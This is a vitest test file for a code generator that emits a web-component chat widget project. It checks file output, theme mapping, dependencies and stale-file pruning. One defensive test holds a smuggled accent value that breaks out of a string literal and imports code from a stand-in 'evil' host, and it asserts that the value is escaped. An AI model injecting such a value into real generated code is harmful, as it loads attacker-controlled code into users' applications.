import { mkdtempSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { generateProject, writeProject } from './codegen';
import { validateConstruct, type Construct } from './schema';

function construct(overrides: Partial<Construct> = {}): Construct {
  const out = validateConstruct({
    name: 'acme-support',
    layout: 'widget',
    provider: { mode: 'mock' },
    ...overrides,
  });
  if (!out.ok) throw new Error(JSON.stringify(out.problems));
  return out.construct;
}

const file = (files: { path: string; code: string }[], path: string) => {
  const f = files.find((f) => f.path === path);
  if (!f) throw new Error(`missing ${path}; got ${files.map((x) => x.path).join(', ')}`);
  return f.code;
};

describe('generateProject (widget + mock core)', () => {
  it('emits the full project file set', () => {
    const paths = generateProject(construct()).map((f) => f.path).sort();
    expect(paths).toEqual(
      [
        'index.html',
        'package.json',
        'src/App.tsx',
        'src/element.tsx',
        'tsconfig.json',
        'vite.config.lib.ts',
        'vite.config.ts',
      ].sort(),
    );
  });

  it('is deterministic: same construct, same bytes', () => {
    expect(generateProject(construct())).toEqual(generateProject(construct()));
  });

  it('facade registers the construct name via @kitn.ai/ui/define', () => {
    const code = file(generateProject(construct()), 'src/element.tsx');
    expect(code).toContain("import { defineWebComponent } from '@kitn.ai/ui/define'");
    expect(code).toContain("defineWebComponent('acme-support'");
  });

  it('mock glue imports state + wire — never a hand-rolled SSE reader', () => {
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).toContain("from '@kitn.ai/ui/state'");
    expect(app).toContain("from '@kitn.ai/ui/wire'");
    expect(app).not.toMatch(/text\/event-stream|EventSource|split\('\\n\\n'\)/);
  });

  it('theme accent lands as --kai-color-primary; mode maps onto the theme prop', () => {
    const files = generateProject(construct({ theme: { accent: '#e91e63', mode: 'dark' } }));
    expect(file(files, 'src/App.tsx')).toContain('\'--kai-color-primary\': "#e91e63"');
    expect(file(files, 'src/element.tsx')).toContain("theme: 'dark' as 'light' | 'dark' | 'auto'");
  });

  it('a hostile accent cannot break out of the emitted string literal', () => {
    // The schema places no charset constraint on `accent` ("any CSS color"); a
    // value containing a single quote must not let attacker-controlled text
    // become live source in the emitted App.tsx (e.g. closing the literal and
    // injecting a new statement/import).
    const hostile = "red'}; import('http://evil/x.js'); const y='";
    const app = file(generateProject(construct({ theme: { accent: hostile } })), 'src/App.tsx');
    // The raw payload must never appear unescaped/unquoted in the source.
    expect(app).not.toContain(`'--kai-color-primary': '${hostile}'`);
    // It must appear only inside a properly JSON-escaped string literal — i.e.
    // the single quote in the payload is escaped, so it cannot terminate the
    // literal early.
    expect(app).toContain(`'--kai-color-primary': ${JSON.stringify(hostile)}`);
    // The raw text right after the property, unescaped, must never be followed
    // by an unescaped `'` — i.e. no bare `'red'` breakout.
    expect(app).not.toMatch(/'--kai-color-primary': 'red'/);
  });

  it('uiSpec overrides the @kitn.ai/ui dependency; default is ^<kit version>', () => {
    const pkg = (spec?: string) =>
      JSON.parse(file(generateProject(construct(), spec ? { uiSpec: spec } : {}), 'package.json'));
    expect(pkg('file:../kitn-ui.tgz').dependencies['@kitn.ai/ui']).toBe('file:../kitn-ui.tgz');
    expect(pkg().dependencies['@kitn.ai/ui']).toMatch(/^\^\d+\.\d+\.\d+$/);
  });

  it('emits no unreferenced imports (the generated tsconfig sets noUnusedLocals)', () => {
    // A named import with no reference anywhere else in the file fails TS6133
    // under the emitted project's own tsconfig.json (noUnusedLocals: true).
    // Grepping for a bare, never-referenced `type { X }` import is a cheap
    // proxy for that without running tsc on the emitted string.
    const app = file(generateProject(construct()), 'src/App.tsx');
    expect(app).not.toContain("import type { MessagePart } from '@kitn.ai/ui/solid';");
  });

  it('emits no non-kit utility classes (interior styling rule)', () => {
    for (const f of generateProject(construct())) {
      expect(f.code).not.toMatch(/class(Name)?="(flex|grid|p-\d|m-\d|text-)/);
    }
  });
});

describe('writeProject', () => {
  it('writes files and prunes stale ones tracked via .kai-manifest.json', () => {
    const dir = mkdtempSync(join(tmpdir(), 'kai-construct-'));
    const projectA = generateProject(construct());
    writeProject(projectA, dir);
    for (const f of projectA) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const projectB = projectA.filter((f) => f.path !== 'index.html');
    writeProject(projectB, dir);

    expect(existsSync(join(dir, 'index.html'))).toBe(false);
    for (const f of projectB) {
      expect(existsSync(join(dir, f.path))).toBe(true);
    }

    const manifest = JSON.parse(readFileSync(join(dir, '.kai-manifest.json'), 'utf8')) as string[];
    expect(manifest).toEqual(projectB.map((f) => f.path).sort());
  });
});
